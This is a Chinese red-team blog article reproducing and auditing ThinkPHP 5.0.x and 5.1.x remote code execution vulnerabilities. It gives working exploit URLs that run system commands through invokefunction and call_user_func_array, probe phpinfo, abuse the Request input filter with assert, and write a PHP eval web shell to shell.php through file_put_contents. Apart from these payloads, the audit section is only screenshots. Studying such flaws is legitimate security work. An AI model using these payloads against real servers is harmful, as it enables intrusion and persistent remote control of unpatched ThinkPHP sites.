#  ThinkPHP框架漏洞解析   
原创 LULU  红队蓝军   2024-08-09 19:00  
  
## ThinkPHP 5.x 远程代码执行漏洞-01   
### 简介  
```
漏洞名称：ThinkPHP 5.0.x-5.1.x 远程代码执行漏洞
影响范围：ThinkPHP v5.0.5 < 5.0.23,ThinkPHP v5.1.0 < 5.1.31
威胁等级：严重
漏洞类型：远程代码执行

```  
  
由于ThinkPHP v5框架对控制器名没有进行足够的安全检测，导致在没有开启强制路由的情况下，黑客构造特定的请求，可直接进行远程的代码执行，进而获得服务器权限。  
### 复现  
  
将TP框架的版本替换到对应的范围即可。这里用的是：**5.1.22**  
>   
> ThinkPHP框架的版本可用通过：$Think.version 在页码输出  
  
#### 命令执行  
```
http://域名/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v72Da8OkibDiakQ9RqNxAqDSGfLzLWMIIH46RlG8vrX3ick460Wvmk98YQMoMu10w9BicumoRAJ7k4Wvg/640?wx_fmt=png&from=appmsg "")  
#### 拿探针  
```
http://www.tp.com/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v72Da8OkibDiakQ9RqNxAqDSGibekeAGSRX0O87xdSqFN9D8rib283I9da14ZNkIaQKapdicLlg8MRUbpg/640?wx_fmt=png&from=appmsg "")  
#### 写shell  
```
http://www.tp.com/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=%3C%3Fphp%20eval(%24_REQUEST%5B6%5D)%3B%3F%3E

```  
>   
>   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v72Da8OkibDiakQ9RqNxAqDSGvwwzGc0hibgSUyXdJDwbBCF5dIsWxMqN4AicicDFq53sqNKTjhpPbj94Q/640?wx_fmt=png&from=appmsg "")  
### 审计  
  
借助xdebug对代码进行断点调试。主要是看这个代码在Thinkphp底层是怎么运行的，以及MVC实现的方式，只要掌握这个基本就能审计代码了。我们拿第一个命令执行来举例：主要审计如何执行到命令的
点断点：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v72Da8OkibDiakQ9RqNxAqDSGgNRkoK6hicnZbnogLkGhLnYDKgtP2xdyxJNcsBQEe4NNWTmLHDhPSUA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v72Da8OkibDiakQ9RqNxAqDSGwWjib5y270B8icvHLY08F9sdmwZ71dfLvrgcj1XBYSbTPG2TLfUR5ISA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v72Da8OkibDiakQ9RqNxAqDSGvpBqbJjhC9JSX3Tjjekw2VBxyTmRCzloKD0rl1s8dmyerceibN5I9hg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v72Da8OkibDiakQ9RqNxAqDSGGRtY66y9ZqTq5lRtDt4jyCbH362NzEn9beLONg9iafNfVKVYJfaCYag/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v72Da8OkibDiakQ9RqNxAqDSGKo7yiadodc65aNJYfia5njg6ZNor8eFsicgEkhqMiaQ4DgjnTwHOSXwreQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v72Da8OkibDiakQ9RqNxAqDSGvibIic5LDImJajV9KtyibofdvuXulamYCiaoKPgFuSbP7PVvcBSdu5PwHA/640?wx_fmt=png&from=appmsg "")  
  
跳出去继续：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v72Da8OkibDiakQ9RqNxAqDSGwrg2rH5VmkxjK2u6ERpgB7zFaKaiboTXbW4PIU3NQ0Tx421iauHxOucA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v72Da8OkibDiakQ9RqNxAqDSGibwM0vjmWDoEHhKgKNq7R43XmOicpW17a5U2yWNLhvAjML5vhUKlaribg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v72Da8OkibDiakQ9RqNxAqDSGrPaWjB8sHgXxE55bS0uGr6ibbgqSMbaf2gGnHjwwzK5LXbG1Hw91cyQ/640?wx_fmt=png&from=appmsg "")  
  
然后就是无限进入函数内部,直到：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v72Da8OkibDiakQ9RqNxAqDSGfRSqF025D6LFtuxJdFJly5DlQjODhezXOC7CibIAD0xYkg6vXpOMDiaA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v72Da8OkibDiakQ9RqNxAqDSGictWWZsDUk360SmmkOykf7QDcbSzic0wIzibl8JnNE0bRsOEMhBuRXeFQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v72Da8OkibDiakQ9RqNxAqDSGfbMicH5Dxwo2d76hMn0Aaby3ABo46hK2U7wz503lZCltTzW7dsYq53Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v72Da8OkibDiakQ9RqNxAqDSGblibiaJ2LdOiaW4v5uuL2uOb8eIowF13NqYcTU12EyI4Fhff1a9w1wPoQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v72Da8OkibDiakQ9RqNxAqDSGYEfzJdu2Bzia1JkHzBE8v4GJiaHKwiaHyzXfxiaDiconF17oJTnMKZwZ08A/640?wx_fmt=png&from=appmsg "")  
  
进去：仔细思考传参  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v72Da8OkibDiakQ9RqNxAqDSGA3iaYIMLshhRTphibohGPAO0KfvuSKqicdIk0QibNWuPa42U7lSicLPFx1g/640?wx_fmt=png&from=appmsg "")  
## ThinkPHP 5.1.x远程代码执行漏洞-02   
### 简介  
```
漏洞名称：ThinkPHP 5.1.x 远程代码执行漏洞
影响范围：ThinkPHP v5.1.0 < 5.1.31
威胁等级：严重
漏洞类型：远程代码执行

```  
### 复现  
#### 命令执行  
```
http://域名?s=index/\think\Request/input&filter=phpinfo&data=1
http://域名?s=index/\think\Request/input&filter=assert&data=phpinfo();

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v72Da8OkibDiakQ9RqNxAqDSGj4r0icfU7VkcEtjMaqvYgWZaF46Svxw6OibsZnGlwnqvE61m7s59Fbzg/640?wx_fmt=png&from=appmsg "")  
#### 命令执行2  
```
http://域名/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=calc

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v72Da8OkibDiakQ9RqNxAqDSGb9MEQhMleRD6PIPERZudeH2FTW95CWiaQNpp7tD8gJnwOmGBXbrTvzw/640?wx_fmt=png&from=appmsg "")  
  
  
加下方wx，拉你一起进群学习  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibZ6uZjjH3v5KP8CaWoS7GAJnWQQxPpibNdibOdl0hc3X6uuBy7rLVOoxS0OSd4vdHWcibFpZg9T9Bx6T7Rn87RoIw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
